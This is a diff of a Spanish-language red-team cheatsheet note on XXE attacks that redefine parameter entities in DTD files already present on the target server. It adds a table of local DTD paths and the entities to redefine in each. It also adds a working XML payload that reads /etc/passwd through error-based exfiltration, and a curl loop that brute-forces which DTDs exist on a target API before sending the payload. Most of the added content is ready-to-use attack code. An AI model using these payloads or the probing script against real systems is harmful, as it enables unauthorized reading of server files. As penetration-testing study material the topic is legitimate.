@@ -1,19 +1,19 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/xxe
   - technique/execution
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación]]'
 tertiary categories:
-  - "[[Web Explotación]]"
+  - '[[Web Explotación]]'
 kind: SubCheatSheet
 linked:
-  - "[[XML External Entity (XXE)]]"
+  - '[[XML External Entity (XXE)]]'
 ---
 # XXE - DTDs Locales
 
@@ -21,33 +21,75 @@ linked:
 
 ## Cheatsheet
 
-| **Entorno / Objetivo**                      | **Ruta Común del DTD Local**             | **Estructura del Payload y Redefinición**                                                                                                                                                                                                                                                                                                                                                                                                           |
-| ------------------------------------------- | ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Sistemas Linux (Entornos con GNOME)**     | `/usr/share/yelp/dtd/docbookx.dtd`       | Inyecto el payload redefiniendo la entidad `ISOamso` declarada en `docbookx.dtd`.<br>`<!DOCTYPE foo [`<br>`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`<br>`<!ENTITY % ISOamso '`<br>`<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">`<br>`<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///inexistente/&#x25;file;&#x27;>">`<br>`&#x25;eval;`<br>`&#x25;error;`<br>`'>`<br>`%local_dtd;]><foo/>` |
-| **Sistemas Linux (Entornos Debian/Ubuntu)** | `/usr/share/xml/fontconfig/fonts.dtd`    | Redefino la entidad `expr` o similar. La lógica de codificación de entidades (como `&#x25;` para `%`) es idéntica al payload anterior, cambiando únicamente la ruta del DTD y la entidad objetivo a sobrescribir.                                                                                                                                                                                                                                   |
-| **Sistemas Windows**                        | `C:\Windows\System32\wbem\xml\wmi20.dtd` | Dependiendo del analizador y la versión de Windows, busco DTDs predeterminados. Alternativamente, si conozco el framework (ej. Java), apunto a archivos dentro del directorio de instalación, como `[RUTA_JAVA]\jre\lib\fontconfig.dtd`.                                                                                                                                                                                                            |
-| **Cisco WebEx / Aplicaciones Específicas**  | `/opt/webex/bin/.../webex.dtd`           | Si la aplicación es un producto empaquetado conocido, investigo el sistema de archivos del appliance para identificar DTDs estáticos y construir la ruta absoluta en el vector `SYSTEM`.                                                                                                                                                                                                                                                            |
-
+| **DTD local target** | **Entidad parámetro a redefinir** | **Cuándo** |
+|:---:|:---:|:---:|
+| `file:///usr/share/yelp/dtd/docbookx.dtd` | `ISOamso` | Linux con GNOME / yelp instalado. |
+| `file:///usr/share/xml/fontconfig/fonts.dtd` | `constant` | Debian/Ubuntu con fontconfig. |
+| `file:///usr/share/dbus-1/interfaces/org.freedesktop.DBus.xml` (XML, no DTD válido) | n/a | Probe de presencia — no redefinible. |
+| `file:///C:/Windows/System32/wbem/xml/cim20.dtd` | `ParamType` | Windows con WMI. |
+| `file:///opt/IBM/WebSphere/AppServer/properties/sdo/eis/eis-binding.dtd` | varies | Java WebSphere. |
+| `jar:file:///path/to/app.jar!/META-INF/resources/foo.dtd` | varies | Java con jars cargados. |
 ^xxe-dtds-locales
 
-## Consideraciones Tácticas y Limitaciones
+### Payload genérico (redefiniendo `ISOamso` de docbookx)
 
-- **Codificación de Entidades:** Es un requisito estricto codificar los caracteres especiales (`%` como `&#x25;`, `&` como `&#x26;`, `'` como `&#x27;`) dentro de la entidad redefinida. Esto asegura que el analizador XML no intente evaluar la carga útil prematuramente en el subconjunto interno, sino que la procese correctamente solo cuando se expanda dentro del contexto del DTD local invocado.
-- **Descubrimiento Ciego:** Encontrar un DTD local válido a menudo requiere fuerza bruta iterando sobre un diccionario de rutas comunes de DTDs para diferentes sistemas operativos. Si el servidor devuelve un error al intentar cargar una ruta, me sirve como indicador de que el archivo no existe; si no devuelve error, he encontrado un DTD válido para explotar.
-- **Dependencia de Errores Visibles:** Si el objetivo es exfiltrar datos (y no solo ejecutar un SSRF), esta técnica asume que el servidor refleja las excepciones del parser XML en la respuesta HTTP, exponiendo la ruta malformada generada por la entidad `%error;`. Si los errores están suprimidos, la exfiltración directa de los datos fracasará.
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+]>
+<foo/>
+```
 
+### Workflow rápido
 
-***
+```bash
+# 1. Brute-force descubrimiento de DTDs locales presentes
+for dtd in \
+    "file:///usr/share/yelp/dtd/docbookx.dtd" \
+    "file:///usr/share/xml/fontconfig/fonts.dtd" \
+    "file:///opt/IBM/WebSphere/properties/sdo/eis/eis-binding.dtd" \
+    "file:///C:/Windows/System32/wbem/xml/cim20.dtd"; do
+  RES=$(curl -s -X POST https://target/api -H 'Content-Type: application/xml' --data \
+    "<!DOCTYPE foo [<!ENTITY % d SYSTEM \"$dtd\"> %d;]><foo/>")
+  # Si no hay error de "cannot resolve" → DTD existe
+  echo "$dtd: $(echo $RES | head -c 200)"
+done
+
+# 2. Una vez identificado un DTD presente — usar payload con redefinición de su entidad
+curl -X POST https://target/api -H 'Content-Type: application/xml' --data @local_dtd_payload.xml
+```
+
+### Lista referencia GTFOXXE
+
+Ver [GTFOXXE](https://github.com/GoSecure/dtd-finder) — `dtd-finder` enumera DTDs en imágenes Docker y devuelve entity-parameter candidates.
+
+___
 
 ## Overview
 
-Cuando me enfrento a un entorno con un [[Firewall de Salida (Egress)]] estricto que bloquea la descarga de archivos DTD desde mi servidor, la técnica de exfiltración convencional mediante DTDs externos queda neutralizada. Para evadir esta restricción y lograr un ataque de [[Blind XXE]], recurro a la reutilización y redefinición de archivos DTD legítimos que ya existen en el sistema de archivos del servidor objetivo.
+Cuando el egress saliente está bloqueado **y** el backend no devuelve errores verbose con datos externos, se reutiliza un DTD **ya presente en el filesystem del servidor**. El DTD legítimo se invoca como si fuera externo (con `file://`), y se redefine una de sus entidades de parámetro para inyectar la lógica `%file → %eval → %error`.
 
-La especificación XML me prohíbe utilizar entidades de parámetros para definir dinámicamente otras entidades dentro del subconjunto DTD interno. Sin embargo, esta restricción no aplica a los DTDs externos. Al invocar un DTD local (presente en el servidor) como si fuera externo, y redefinir una de las entidades de parámetros que este DTD declara, puedo inyectar mi propia lógica maliciosa. Cuando el parser procesa el DTD local, evalúa mi entidad redefinida, permitiéndome encadenar la lectura de archivos con una [[Exfiltración Basada en Errores]] o forzar una interacción de red permitida.
+### Mecanismo
 
-***
+1. **`%local_dtd`** carga un DTD del filesystem (ej. `docbookx.dtd`).
+2. **Redefinir una entidad de parámetro** declarada en ese DTD (ej. `%ISOamso`) con la lógica de blind error.
+3. Al expandirse el DTD local, el parser evalúa la redefinición → arroja error con el archivo embebido.
 
-## Notas Relacionadas
+### Por qué funciona
 
+La especificación XML prohíbe entity-defining-entity en el subset DTD **interno** del documento, pero la regla **no aplica** dentro de DTDs externos. Cualquier DTD cargado vía `SYSTEM` cuenta como externo — incluso uno local en `/usr/share/`.
+
+### Limitaciones
+
+- **Descubrimiento de DTDs presentes:** requiere fuerza bruta. Sin error de "cannot resolve" = DTD existe.
+- **Errores verbose obligatorios:** sin reflejo del error de parser → no hay exfil (mismo problema que [[XXE - Blind Basado en Errores]]).
+- **Encoding correcto:** `%` debe ser `&#x25;`, `&` debe ser `&#x26;`, `'` debe ser `&#x27;` dentro de la entidad redefinida.
 
 ***
